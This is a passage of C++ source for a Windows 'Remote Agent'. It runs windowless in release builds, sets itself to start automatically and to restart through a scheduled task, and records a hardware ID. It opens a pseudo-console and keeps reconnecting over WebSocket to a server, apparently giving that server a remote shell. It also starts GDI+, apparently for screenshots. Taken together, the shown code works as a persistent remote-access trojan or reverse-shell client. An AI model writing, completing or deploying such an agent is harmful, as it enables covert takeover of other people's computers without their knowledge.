        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %d\n", GetLastError());
        return false;
    }

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, nullptr, 0)) {
        printf("WinHttpSetOption failed: %d\n", GetLastError());
        return false;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed: %d\n", GetLastError());
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
        printf("WinHttpReceiveResponse failed: %d\n", GetLastError());
        return false;
    }

    g_state.hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, 0);
    WinHttpCloseHandle(hRequest);

    if (g_state.hWebSocket) {
        printf("WebSocket connected successfully!\n");
        g_state.wsConnected = true;
        g_state.reconnectAttempts = 0;
        return true;
    }

    printf("WebSocket upgrade failed\n");
    return false;
}

void Cleanup(bool fullCleanup) {
    if (fullCleanup) {
        g_state.running = false;
    }

    if (g_state.hWebSocket) {
        WinHttpWebSocketClose(g_state.hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, nullptr, 0);
        WinHttpCloseHandle(g_state.hWebSocket);
        g_state.hWebSocket = nullptr;
    }
    if (g_state.hConnect) {
        WinHttpCloseHandle(g_state.hConnect);
        g_state.hConnect = nullptr;
    }
    if (g_state.hSession) {
        WinHttpCloseHandle(g_state.hSession);
        g_state.hSession = nullptr;
    }

    if (fullCleanup) {
        if (g_state.hProcess != INVALID_HANDLE_VALUE) {
            TerminateProcess(g_state.hProcess, 0);
            CloseHandle(g_state.hProcess);
            g_state.hProcess = INVALID_HANDLE_VALUE;
        }
        if (g_state.hPseudoConsole && g_ClosePseudoConsole) {
            g_ClosePseudoConsole(g_state.hPseudoConsole);
            g_state.hPseudoConsole = nullptr;
        }
        if (g_state.hPipeIn != INVALID_HANDLE_VALUE) {
            CloseHandle(g_state.hPipeIn);
            g_state.hPipeIn = INVALID_HANDLE_VALUE;
        }
        if (g_state.hPipeOut != INVALID_HANDLE_VALUE) {
            CloseHandle(g_state.hPipeOut);
            g_state.hPipeOut = INVALID_HANDLE_VALUE;
        }
    }

    g_state.wsConnected = false;
}

int GetReconnectDelay() {
    if (!Config::USE_EXPONENTIAL_BACKOFF) {
        return Config::RECONNECT_DELAY_MS;
    }

    int delay = Config::RECONNECT_DELAY_MS * (1 << std::min(g_state.reconnectAttempts, 6));
    return std::min(delay, Config::RECONNECT_BACKOFF_MAX_MS);
}

#ifdef _DEBUG
int main() {
#else
#ifdef UNICODE
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {
#endif
#endif
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    printf("=== Remote Agent Starting ===\n");
    printf("Debug Mode: %s\n", Config::DEBUG_MODE ? "ON" : "OFF");
    printf("Auto-Start: %s\n", Config::AUTO_START ? "ON" : "OFF");
    printf("Auto-Restart: %s\n", Config::AUTO_RESTART_ON_CRASH ? "ON" : "OFF");
    printf("Max Reconnect Attempts: %s\n", Config::MAX_RECONNECT_ATTEMPTS == 0 ? "INFINITE" : std::to_string(Config::MAX_RECONNECT_ATTEMPTS).c_str());

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_state.gdiplusToken, &gdiplusStartupInput, NULL);

    InitMetrics();

    SetAutoStart(exePath);
    CreateAutoRestartTask(exePath);

    std::string deviceId = GetHWID();
    std::string deviceName = GetDeviceName();

    printf("Device ID: %s\n", deviceId.c_str());
    printf("Device Name: %s\n", deviceName.c_str());
    printf("==============================\n\n");

    if (!CreateConPTY()) {
        printf("Failed to create ConPTY. Exiting...\n");
        return 1;
    }

    std::thread outputThread(ReadPTYOutput);

    while (g_state.shouldReconnect && g_state.running) {
        if (Config::MAX_RECONNECT_ATTEMPTS > 0 &&
            g_state.reconnectAttempts >= Config::MAX_RECONNECT_ATTEMPTS) {
            printf("Max reconnection attempts (%d) reached. Exiting...\n",
                Config::MAX_RECONNECT_ATTEMPTS);
            break;
        }

        if (g_state.reconnectAttempts > 0) {
            int delay = GetReconnectDelay();
            printf("\nReconnection attempt %d", g_state.reconnectAttempts + 1);
            if (Config::MAX_RECONNECT_ATTEMPTS > 0) {
                printf("/%d", Config::MAX_RECONNECT_ATTEMPTS);
            }
            printf(" (waiting %d ms)...\n", delay);
            Sleep(delay);
        }

        g_state.reconnectAttempts++;

        if (ConnectWebSocket(deviceId, deviceName)) {
            printf("Connected! Starting WebSocket receive loop...\n");

            std::thread keepAliveThread(KeepAliveThread);

            WebSocketReceiveLoop();

            printf("WebSocket disconnected. Cleaning up...\n");

            if (keepAliveThread.joinable()) {
                keepAliveThread.join();
            }

            Cleanup(false);
        }
        else {
            printf("Failed to connect to WebSocket\n");
            Cleanup(false);
        }

        if (!g_state.running) {
            printf("Application shutting down...\n");
            break;
        }
    }

    printf("\n=== Shutting down ===\n");
    Cleanup(true);

    if (outputThread.joinable()) {
        outputThread.join();
    }

    printf("Cleanup complete. Goodbye!\n");
    return 0;
}